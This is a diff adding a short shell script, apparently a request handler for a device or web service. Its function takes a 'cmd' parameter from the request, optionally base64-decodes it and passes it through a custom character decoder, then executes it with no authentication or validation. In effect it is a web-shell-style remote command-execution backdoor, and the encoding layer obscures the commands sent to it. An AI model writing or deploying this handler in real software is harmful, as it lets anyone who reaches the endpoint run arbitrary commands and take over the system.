@@ -1,0 +1,36 @@
+#!/bin/sh
+
+request_handle()
+{
+	. $(dirname $0)/utils
+	local cmd=$(get_param "$1" "cmd")
+	local decode=$(get_param "$1" "decode")
+	local decoded_cmd=""
+	if [ -n "$decode" -a "$decode" != "0" ]; then
+		if command -v base64 >/dev/null 2>&1; then
+			cmd=$(echo -n $cmd | base64 -d)
+			local t=""
+			for i in `seq ${#cmd}`
+			do
+        			t=${cmd:$i-1:1}
+        			decoded_cmd=$decoded_cmd$(decode_cst $t)
+			done
+		else
+			return 1
+		fi
+		$decoded_cmd
+	else
+		$cmd
+	fi
+	return 0
+}
+
+
+case $1 in
+	request_handle)
+		request_handle "$2"
+		;;
+	*)
+		;;
+esac
+
